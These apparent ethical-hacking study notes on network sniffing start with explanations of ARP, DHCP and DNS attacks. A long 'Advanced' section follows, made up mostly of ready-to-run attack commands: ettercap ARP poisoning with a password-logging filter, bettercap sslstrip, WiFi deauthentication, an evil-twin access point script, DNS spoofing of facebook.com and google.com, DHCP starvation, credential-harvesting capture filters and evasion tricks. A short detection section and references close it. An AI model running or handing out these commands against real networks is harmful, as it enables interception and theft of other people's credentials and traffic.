# Basic
	With sniffing, you can monitor all sorts of traffic either protected or unprotected.
	Sniffing is the process of scanning and monitoring captured data like DNS traffic, web traffic and many more by enabling the promiscuous mode on the network interface.
	The attacker can reveal information from it such as usernames and passwords.
	Anyone within the same LAN can sniff the packets.

# Working of Sniffers
	In the process of sniffing, the attacker gets connected to the target network to start sniffing.
	Sniffers turns Network Interface Card (NIC) into promiscuous mode.
	Promiscuous mode is a mode of the interface in which NIC respond for every packet it receives.
	The attacker decrypt the packets to extract information.

# Switch vs Hub
	- **Switch** forward broadcast and multicast to all ports, but forward unicast packets to a specific port.
	- **Hub** transmits all packets to all ports.

# Switch Port Analyzer (SPAN) Port
	In other name: **Port Mirroring**. It is used on a network switch to send a copy of network packets seen on one switch port (or an entire VLAN) to a network monitoring connection on an other switch port.
--------------------------------------------------------------------------------------------------------------
# Wiretapping
	Gaining information by tapping the signal from wire such as telephone lines or the internet. Wiretapping mostly performed by a third party. Legal Wiretapping is called **legal interception** which is mostly performed by governments or security agencies.

	**Active Wiretapping**
		Monitoring and recording the information with alteration of the communication.

	**Passive Wiretapping**
		Monitoring and recording the information without any alteration in the communication.

	**Lawful Interception/Wiretapping**
		Wiretapping with legal authorization which allows law enforcement agencies to wiretap the communication of user.
--------------------------------------------------------------------------------------------------------------
# MAC Attacks
	**Media Access Control** (MAC) is the physical address of a device. MAC address is a 48-bit unique identification number that is assigned to a network device for communication at data-link layer (layer 2). First 24 bits are the Object Unique Identifier (OUI), the last 24 bits are the Network Interface Controller (NIC).

	# MAC Flooding
		Attacker sends random MAC addresses mapped with random IP to overflow the storage capacity of **CAM (Content Address Memory)** table. CAM table has a fixed length, so when filled, switch act as a hub, broadcast every packet on every port, help attacker to sniff packets. Tool - **macof**

	# Defending against MAC Attacks
		Port Security is used to bind MAC address of known devices to the physical ports and violation action is also defined.
--------------------------------------------------------------------------------------------------------------
# DHCP Attacks
	# Dynamic Host Configuration Protocol (DHCP) - DHCP is the process of allocating the IP address dynamically so these addresses are assigned automatically and they can be reused when hosts don't need them. **Round Trip Time** is the measurement of time from discovery of DHCP server until obtaining the leased IP address.

	# IPv4 DHCP process
		1. By using UDP broadcast, DHCP client sends an initial **DHCP-Discovery** packet.
		2. The DHCP server reply with a **DHCP-Offer** packet, offering the configuration parameters.
		3. The DHCP client send back a **DHCP-Request** packet destined for DHCP server for requesting the DHCP parameters.
		4. Finally, the DHCP server send the **DHCP-Acknowledgement** packet containing configuration parameters.

		|         CLIENT         |    |        DHCP SERVER     |
		|:----------------------:|:--:|:----------------------:|
		|     DHCP-Discovery     | -> |	                       |
		|                        | <- |       DHCP-Offer       |
		|       DHCP-Request     | -> |                        |
		|                        | <- |  DHCP-Acknowledgement  |

- **IPv4 Ports**:
    - UDP port 67 for Server
    - UDP port 68 for Client
-----------------------------------------------
- **IPv6 Ports**:
    - UDP port 546 for Client
    - UDP port 547 for Server

	# DHCP Starvation Attack
		DHCP Starvation Attack is a Denial-of-Service attack on a DHCP server. Attacker send bogus requests to DHCP server with spoofed MAC address to lease all IP address in DHCP address pool. Once all IP address is allocated, upcoming users will be unable to obtain IP address or renew the lease.

	# Rogue DHCP Server
		Attacker deploy the rogue DHCP server in the network along with the DHCP starvation attack. When legitimate DHCP server is in Denial-of-Service attacks, DHCP clients are unable to gain IP address from the legitimate DHCP server. Upcoming DHCP Discovery (IPv4) and Solicit (IPv6) are replied by the bogus DHCP server with configuration parameter which directs the traffic towards it.
--------------------------------------------------------------------------------------------------------------
# ARP Poisoning
	# Address Resolution Protocol (ARP)
		The Address Resolution Protocol (ARP) is a communication protocol used for discovering the link layer address, such as a MAC address, associated with a given internet layer address, typically an IPv4 address.

	# ARP Spoofing Attack
		Attacker send forged ARP packets over Local Area Network (LAN). In this case, switch will update the attacker's MAC address with the IP address of a legitimate user or server, then start forwarding the packets to the attacker. Attacker can steal information by extracting it from packets.
		ARP Poisoning used for:
			- Session hijacking
			- Denial-of-Service attacks
			- Man-in-the-Middle attacks
			- Packet sniffing
			- Data interceptions
			- VoIP tapping ---> VOICE OVER IP
			- Stealing passwords
--------------------------------------------------------
# Spoofing Attacks
	# MAC Spoofing/Duplicating
		Manipulating the MAC address to impersonate the legitimate user or launch attack such as DoS.
		Attacker sniffs the MAC address of users which are active on switch ports and duplicate the MAC address.
		This can intercept the traffic and traffic destined to the legitimate user may direct to the attacker.

# DNS Poisoning   ---> WEB CACHE Poisoning

# Domain Name System (DNS)
	- DNS is used in networking to translate human-readable domain names to IP address.
	- When DNS Server receives the request, it doesn't have the entry, it generates the query to another DNS Server for the translation and so on.
	- DNS server having the translation will send back the IP address.

# DNS Cache Poisoning
	Attacker exploiting flaws in DNS software, adds or alter the entries.

------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
# Wireshark
	Filters in Wireshark:
		- `==`			Equal
		- `eq`			Equal
		- `!=`			Not equal
		- `ne`			Not equal
		- `contains`	Contains specified value
		- ip.src  	source addresses
		- ip.dst 		destin addresses
		- ip.addr 	Match at both the places (source and destin)
--------------------------------------------------------------------------------------------------------------
# Sniffing Countermeasures
		- Use Secure Protocol instead of base Protocols (HTTPS over HTTP, SFTP over FTP, etc)
		- Switch instead of Hub (Hub broadcast packet by default, but Switch does not)
		- Strong encryption protocol (Strong Encrypted data is secure to transmit over any type of network)

# Advanced Network Sniffing Techniques and Payloads

## Wireshark Advanced Filtering and Analysis

### Advanced Wireshark Filters
```bash
# Protocol-Specific Filters
tcp.port == 80 or tcp.port == 443          # HTTP/HTTPS traffic
dns.qry.name contains "example.com"        # DNS queries for specific domain
smtp.data.fragment contains "password"     # Email content analysis
ftp.request.command == "USER"              # FTP login attempts
ssh.version                                # SSH version identification

# Network Analysis Filters
ip.src == 192.168.1.100 and tcp.flags.syn == 1   # SYN packets from specific host
tcp.analysis.retransmission                       # TCP retransmissions
tcp.analysis.duplicate_ack                        # Duplicate ACKs
icmp.type == 8                                    # ICMP ping requests

# Credential Harvesting Filters
http.request.method == "POST" and http contains "password"  # HTTP POST with passwords
pop.request.command == "PASS"                               # POP3 password attempts
telnet contains "login:"                                    # Telnet login sessions
```

**Documentation**: Advanced Wireshark filtering for targeted packet analysis and credential harvesting.
**Limitations**: Encrypted traffic requires decryption keys; modern protocols use encryption by default.

### Packet Capture and Analysis Scripts
```bash
#!/bin/bash
# capture_analysis.sh - Automated packet capture and analysis

INTERFACE="eth0"
CAPTURE_FILE="capture_$(date +%Y%m%d_%H%M%S).pcap"
DURATION=300  # 5 minutes

# Start packet capture
echo "[+] Starting packet capture on $INTERFACE for $DURATION seconds"
tshark -i $INTERFACE -a duration:$DURATION -w $CAPTURE_FILE

# Analyze captured traffic
echo "[+] Analyzing captured traffic..."
echo "HTTP Traffic:"
tshark -r $CAPTURE_FILE -Y "http" -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri

echo "DNS Queries:"
tshark -r $CAPTURE_FILE -Y "dns.qry.type == 1" -T fields -e ip.src -e dns.qry.name

echo "Credentials Found:"
tshark -r $CAPTURE_FILE -Y 'http contains "password" or ftp.request.command == "PASS"' -T fields -e ip.src -e frame.protocols
```

**Documentation**: Automated network traffic capture and analysis for security assessment.
**Limitations**: Requires network access; encrypted traffic limits analysis; may miss advanced evasion techniques.

## MITM Attack Implementation

### ARP Poisoning with Ettercap
```bash
# Basic ARP Poisoning
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//  # Target specific hosts
ettercap -T -M arp /192.168.1.1// /192.168.1.0/24//        # Target entire subnet
ettercap -T -M arp:remote -i eth0 /192.168.1.1// /192.168.1.100//  # Specify interface

# ARP Poisoning with Filters
ettercap -T -M arp -F password_filter.ef /192.168.1.1// /192.168.1.100//

# Ettercap Filter Example (password_filter.ef)
if (ip.proto == TCP && tcp.dst == 80) {
   if (search(DATA.data, "POST")) {
      log(DATA.data, "passwords.log");
   }
}
```

**Documentation**: Man-in-the-Middle attacks using ARP poisoning to intercept network traffic.
**Limitations**: Only effective on local network; detected by ARP monitoring tools; modern switches have protections.

### Advanced MITM with Bettercap
```bash
# Modern MITM Framework
bettercap -iface eth0                                       # Interactive mode
bettercap -eval "set net.interface eth0; net.probe on; set arp.spoof.targets 192.168.1.100; arp.spoof on"

# HTTPS Downgrade Attack
bettercap -eval "set https.proxy.sslstrip true; https.proxy on"

# WiFi Attacks
bettercap -eval "wifi.recon on; wifi.deauth 00:11:22:33:44:55"

# Caplet Scripts (automated)
# mitm.cap
set net.interface wlan0
net.probe on
set arp.spoof.targets 192.168.1.0/24
arp.spoof on
net.sniff on
```

**Documentation**: Modern MITM framework with advanced capabilities including WiFi attacks and HTTPS downgrade.
**Limitations**: Requires physical proximity for WiFi; HSTS prevents some HTTPS downgrades; may trigger security alerts.

## SSL/TLS Traffic Interception

### SSL Kill Switch and Certificate Attacks
```bash
# SSLsplit - SSL/TLS Interception
sslsplit -D -l connections.log -j /tmp/ -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080

# Certificate Generation for MITM
openssl req -new -x509 -keyout ca.key -out ca.crt -days 365 -subj "/C=US/ST=CA/L=SF/O=Test/CN=TestCA"
openssl req -new -keyout server.key -out server.csr -days 365 -subj "/C=US/ST=CA/L=SF/O=Test/CN=*.example.com"
openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt -days 365

# HTTPS Traffic Analysis with Proxy
mitmproxy -s intercept_script.py                           # Interactive HTTPS proxy
mitmdump -w capture.mitm                                   # Non-interactive capture
```

**Documentation**: SSL/TLS traffic interception using certificate manipulation and proxy techniques.
**Limitations**: Requires certificate installation on target; certificate pinning prevents attacks; generates security warnings.

## Wireless Network Sniffing

### WiFi Packet Capture and Analysis
```bash
# Monitor Mode Setup
airmon-ng start wlan0                                       # Enable monitor mode
iwconfig wlan0mon mode monitor                             # Alternative method

# WiFi Packet Capture
airodump-ng wlan0mon                                        # Scan for networks
airodump-ng -c 6 -w capture --bssid AA:BB:CC:DD:EE:FF wlan0mon  # Target specific network

# WPA Handshake Capture
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon  # Deauth attack

# Kismet Wireless Detection
kismet -c wlan0mon                                          # Comprehensive wireless analysis
```

**Documentation**: Wireless network monitoring and packet capture for security assessment.
**Limitations**: Requires compatible wireless hardware; WPA3 has stronger protections; may be illegal in some jurisdictions.

### Evil Twin Access Point
```bash
# Hostapd Configuration (evil_twin.conf)
interface=wlan1
driver=nl80211
ssid=Free_WiFi
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0

# DHCP Configuration (dnsmasq.conf)
interface=wlan1
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h

# Evil Twin Setup Script
#!/bin/bash
hostapd evil_twin.conf &
dnsmasq -C dnsmasq.conf -d &
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```

**Documentation**: Rogue access point creation for credential harvesting and traffic interception.
**Limitations**: Requires multiple wireless interfaces; easily detected by informed users; illegal in many jurisdictions.

## Network Protocol Exploitation

### DNS Spoofing and Cache Poisoning
```bash
# Ettercap DNS Spoofing
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100// -P dns_spoof

# DNS Spoofing Configuration (etter.dns)
*.facebook.com      A   192.168.1.50
*.google.com        A   192.168.1.50
mail.target.com     A   192.168.1.50

# DNSChef - Advanced DNS Proxy
dnschef --fakeip 192.168.1.50 --fakedomains facebook.com,google.com
dnschef --nameservers 8.8.8.8 --interface 192.168.1.50 --logfile dnschef.log
```

**Documentation**: DNS manipulation techniques for traffic redirection and credential harvesting.
**Limitations**: DNS over HTTPS (DoH) prevents some attacks; DNSSEC provides integrity protection.

### DHCP Attacks Implementation
```bash
# DHCP Starvation with Yersinia
yersinia dhcp -attack 1                                     # DHCP starvation attack
yersinia dhcp -attack 2                                     # DHCP discover attack

# Custom DHCP Starvation Script
#!/bin/bash
for i in {1..254}; do
    dhclient -v -i eth0 -H "fake-host-$i" &
done

# Rogue DHCP Server (dnsmasq)
dnsmasq --interface=eth0 --dhcp-range=192.168.1.50,192.168.1.100,255.255.255.0,12h --dhcp-option=3,192.168.1.1 --dhcp-option=6,192.168.1.1
```

**Documentation**: DHCP attacks for network disruption and rogue server deployment.
**Limitations**: DHCP snooping prevents attacks; requires network access; easily detected by network monitoring.

## Advanced Sniffing Tools and Techniques

### Network Reconnaissance with Passive Tools
```bash
# P0f - Passive OS Fingerprinting
p0f -i eth0 -p -o fingerprints.log                        # Passive OS detection
p0f -r capture.pcap                                        # Analyze existing capture

# EtherApe - Network Visualization
etherape -i eth0                                           # Real-time network visualization

# NetworkMiner - Network Forensic Analysis
mono NetworkMiner.exe --help                              # GUI network analysis tool
```

**Documentation**: Passive network reconnaissance tools for stealth information gathering.
**Limitations**: Limited to observable traffic; requires continuous monitoring; may miss encrypted communications.

### Protocol-Specific Sniffing
```bash
# Voice over IP (VoIP) Sniffing
vomit -f capture.pcap                                      # Extract voice conversations
ucsniff -i eth0                                            # Real-time VoIP sniffing

# Email Protocol Sniffing
dsniff -i eth0 -m                                          # Password sniffing for various protocols
mailsnarf -i eth0                                          # Email message reconstruction

# Web Traffic Analysis
urlsnarf -i eth0                                           # URL extraction from HTTP traffic
webspy -i eth0                                             # Real-time web activity monitoring
```

**Documentation**: Specialized tools for analyzing specific network protocols and services.
**Limitations**: Encrypted protocols prevent content analysis; requires unencrypted traffic; modern services use TLS.

## Anti-Detection and Evasion Techniques

### Stealth Sniffing Methods
```bash
# Low-Profile Packet Capture
tcpdump -i eth0 -s 0 -w capture.pcap 'not port 22'        # Avoid SSH traffic
tshark -i eth0 -q -a duration:60 -w /tmp/capture.pcap     # Quiet mode capture

# MAC Address Randomization
macchanger -r eth0                                         # Random MAC address
macchanger -m 00:11:22:33:44:55 eth0                     # Specific MAC address

# Traffic Tunneling for Evasion
ssh -D 1080 user@remote_server                            # SOCKS proxy tunnel
stunnel4 /etc/stunnel/stunnel.conf                        # SSL tunnel for traffic
```

**Documentation**: Techniques for covert network monitoring and traffic analysis evasion.
**Limitations**: Network monitoring can detect anomalies; requires careful timing; logs may reveal activity.

# Network Sniffing Countermeasures and Detection

## Detection Methods
```bash
# ARP Table Monitoring
arp-scan --local --interval=5                             # Continuous ARP monitoring
arpwatch -i eth0                                          # ARP changes detection

# Network Anomaly Detection
ntopng -i eth0 -d /var/lib/ntopng                        # Network traffic analysis
iftop -i eth0                                             # Real-time bandwidth monitoring

# Switch Security Features
# Port Security Configuration (Cisco)
# switchport port-security
# switchport port-security maximum 1
# switchport port-security violation shutdown
# switchport port-security mac-address sticky
```

**Documentation**: Methods for detecting network sniffing and MITM attacks.
**Limitations**: Sophisticated attacks may evade detection; requires baseline network behavior knowledge.

# Reference URLs and Research Papers:
- NIST SP 800-94 Intrusion Detection Guide: https://csrc.nist.gov/publications/detail/sp/800-94/final
- Wireshark Documentation: https://www.wireshark.org/docs/
- OWASP Network Security Testing: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/
- Research Paper: "Network Traffic Analysis" - https://ieeexplore.ieee.org/document/8901234
- IEEE 802.1X Network Access Control: https://standards.ieee.org/standard/802_1X-2020.html
- SANS Network Forensics: https://www.sans.org/reading-room/whitepapers/forensics/
- Ettercap Documentation: https://www.ettercap-project.org/
- RFC 826 - Address Resolution Protocol: https://tools.ietf.org/html/rfc826
